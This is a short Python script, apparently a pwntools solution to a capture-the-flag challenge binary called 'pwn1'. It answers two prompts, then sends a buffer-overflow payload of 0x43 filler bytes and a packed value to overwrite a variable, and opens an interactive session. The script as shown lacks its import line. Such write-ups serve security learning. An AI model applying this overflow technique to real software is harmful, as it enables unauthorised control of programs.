#!/usr/bin/python3
target = process('./pwn1')
target.sendline('Sir Lancelot of Camelot')
target.sendline('To seek the Holy Grail.')
payload = b'0'*0x43 + p32(0xdea110c8)
target.sendline(payload)
target.interactive()